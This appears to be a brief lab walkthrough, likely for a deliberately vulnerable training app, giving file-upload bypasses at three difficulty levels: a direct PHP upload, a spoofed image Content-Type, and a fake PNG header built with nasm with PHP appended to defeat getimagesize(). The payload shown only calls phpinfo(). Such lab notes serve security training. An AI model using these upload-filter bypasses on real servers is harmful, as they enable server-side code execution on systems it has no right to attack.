# File Upload

## low

```php
<?php phpinfo(); ?>
```

## medium

```
Content-Disposition: form-data; name="uploaded"; filename="test.php"
Content-Type: image/jpeg

<?php phpinfo(); ?>
```

## high

bypass `getimagesize()` with a dummy png header `fakepng.asm`

```sh
nasm -f bin -o fake.png fakepng.asm
echo -n "<?php phpinfo();?>" | cat fake.png - > a.png
```

then see `fi.md` to exploit it
